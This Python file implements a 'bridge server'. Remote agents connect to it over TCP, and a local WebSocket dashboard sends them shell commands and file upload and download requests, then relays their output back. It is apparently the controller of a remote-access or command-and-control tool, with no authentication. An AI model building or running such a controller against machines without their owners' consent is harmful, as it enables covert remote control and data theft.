#!/usr/bin/env python3
# filepath: bridge_server_new.py
import asyncio
import threading
import socket
import websockets
import json
import os

# TCP server for agents
AGENT_PORT = 8765
AGENT_HOST = '0.0.0.0'  # Listen on all interfaces to accept remote connections

# WebSocket server for dashboard
DASHBOARD_PORT = 9000
DASHBOARD_HOST = '127.0.0.1'

connected_agents = {}  # agent_id: (conn, queue)
dashboard_clients = set()

# TCP server for agents
def tcp_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((AGENT_HOST, AGENT_PORT))
    s.listen()
    print(f"[BRIDGE] TCP server listening on {AGENT_HOST}:{AGENT_PORT}")
    while True:
        conn, addr = s.accept()
        agent_id = conn.recv(1024).decode().strip()
        print(f"[BRIDGE] Agent connection from {addr}, id='{agent_id}'")
        if not agent_id:
            print("[BRIDGE] Empty agent_id, closing connection.")
            conn.close()
            continue
        q = asyncio.Queue()
        connected_agents[agent_id] = (conn, q)
        print(f"[BRIDGE] Agent '{agent_id}' registered. Agents now: {list(connected_agents.keys())}")
        # Notify dashboards
        msg = json.dumps({"type": "agent_list", "agents": list(connected_agents.keys())})
        for ws in list(dashboard_clients):
            try:
                asyncio.run_coroutine_threadsafe(ws.send(msg), ws.loop)
            except Exception as e:
                print(f"[BRIDGE] Error notifying dashboard: {e}")
        threading.Thread(target=handle_agent, args=(conn, agent_id, q), daemon=True).start()

def handle_agent(conn, agent_id, queue):
    # Forward agent info to dashboards on connect
    try:
        data = conn.recv(4096)
        if not data:
            return
        try:
            msg = json.loads(data.decode(errors='replace'))
            print(f"[BRIDGE] First message from agent {agent_id}: {msg}")  # DEBUG
            if msg.get('action') == 'agent_info':
                for ws in list(dashboard_clients):
                    try:
                        asyncio.run_coroutine_threadsafe(ws.send(data.decode(errors='replace')), ws.loop)
                    except Exception as e:
                        print(f"[BRIDGE] Error forwarding agent info: {e}")
                # Continue to normal loop for commands
            else:
                # Not agent_info, process as normal
                handle_agent_command(data, agent_id)
        except Exception as e:
            print(f"[BRIDGE] Exception parsing agent info: {e}")
            handle_agent_command(data, agent_id)
    except Exception as e:
        print(f"[BRIDGE] Error receiving first message: {e}")
        return
    # Now process commands as before
    while True:
        try:
            data = conn.recv(4096)
            if not data:
                break
            handle_agent_command(data, agent_id)
        except Exception as e:
            print(f"[BRIDGE] Error in agent command loop: {e}")
            break
    del connected_agents[agent_id]
    print(f"[BRIDGE] Agent '{agent_id}' disconnected. Agents now: {list(connected_agents.keys())}")
    # Notify dashboards
    msg = json.dumps({"type": "agent_list", "agents": list(connected_agents.keys())})
    for ws in list(dashboard_clients):
        try:
            asyncio.run_coroutine_threadsafe(ws.send(msg), ws.loop)
        except Exception:
            pass

def handle_agent_command(data, agent_id):
    try:
        msg = json.loads(data.decode(errors='replace'))
        if msg.get('action') in ('download', 'upload', 'agent_info'):
            # Already handled or not a shell command
            for ws in list(dashboard_clients):
                try:
                    asyncio.run_coroutine_threadsafe(ws.send(data.decode(errors='replace')), ws.loop)
                except Exception:
                    pass
            return
    except Exception:
        pass
    # Forward output to all dashboards (for shell command output)
    msg = json.dumps({"agent_id": agent_id, "output": data.decode(errors='replace')})
    for ws in list(dashboard_clients):
        try:
            asyncio.run_coroutine_threadsafe(ws.send(msg), ws.loop)
        except Exception:
            pass

# WebSocket server for dashboard
async def dashboard_ws(websocket, path):
    """Handler for dashboard websocket connections.
    
    Args:
        websocket: The WebSocket connection.
        path: The request path (required by websockets API in Python 3.11).
    """
    print(f"[BRIDGE] Dashboard WebSocket connection from {websocket.remote_address}")
    dashboard_clients.add(websocket)
    # Send current agent list on connect
    await websocket.send(json.dumps({"type": "agent_list", "agents": list(connected_agents.keys())}))
    print(f"[BRIDGE] Sent agent list to dashboard: {list(connected_agents.keys())}")
    try:
        async for message in websocket:
            data = json.loads(message)
            if data.get("type") == "get_agents":
                await websocket.send(json.dumps({"type": "agent_list", "agents": list(connected_agents.keys())}))
                continue
            # Handle file upload/download actions
            if data.get("action") in ("upload", "download"):
                agent_id = data["agent_id"]
                if agent_id in connected_agents:
                    conn, q = connected_agents[agent_id]
                    conn.sendall(json.dumps(data).encode())
                continue
            # Handle normal command
            agent_id = data.get("agent_id")
            command = data.get("command", None)
            if agent_id in connected_agents and command is not None:
                conn, q = connected_agents[agent_id]
                conn.sendall(command.encode())
    finally:
        dashboard_clients.remove(websocket)
        print(f"[BRIDGE] Dashboard disconnected, remaining: {len(dashboard_clients)}")

def start_ws_server():
    """Start the WebSocket server for dashboard connections."""
    async def main():
        print(f"[BRIDGE] Starting WebSocket server on {DASHBOARD_HOST}:{DASHBOARD_PORT}")
        async with websockets.serve(dashboard_ws, DASHBOARD_HOST, DASHBOARD_PORT):
            print(f"[BRIDGE] WebSocket server listening on {DASHBOARD_HOST}:{DASHBOARD_PORT}")
            await asyncio.Future()  # run forever
    
    try:
        asyncio.run(main())
    except Exception as e:
        print(f"[BRIDGE] Error starting WebSocket server: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    print("[BRIDGE] Starting bridge server...")
    threading.Thread(target=tcp_server, daemon=True).start()
    print("[BRIDGE] TCP server thread started")
    start_ws_server()
